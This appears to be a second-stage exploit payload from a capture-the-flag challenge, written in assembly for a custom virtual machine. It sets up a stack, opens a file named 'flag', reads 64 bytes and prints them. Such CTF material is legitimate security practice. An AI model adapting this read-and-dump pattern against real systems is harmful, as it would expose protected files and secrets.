padding : 0xffff
jmp begin_stage_2

str_flag : "flag" ; this location will be 0x8004

begin_stage_2 :
mov rsp, 0xff00
mov rbp, rsp

; rbp-0x2 = filedes for flags
sub rsp, 0x10

; open "flags" file
mov r2, 1
mov r1, 0x8004
mov r0, 0
syscall

; store filedes for "flags" file and then place in r1
mov r1, rbp
sub r1, 2
stor r1, r0
mov r1, r0

; create 64 bytes of space for flags file
sub rsp, 0x40

; read flags file
mov r3, 0x40
mov r2, rsp
mov r0, 1
syscall

; output contents of flags file
mov r2, rsp
sploit_stage_2_loop :
    cmp r0, 0
    je sploit_stage_2_done
    loadb r3, r2
    out r3
    sub r0, 1
    add r2, 1
    jmp sploit_stage_2_loop

sploit_stage_2_done :
    hlt
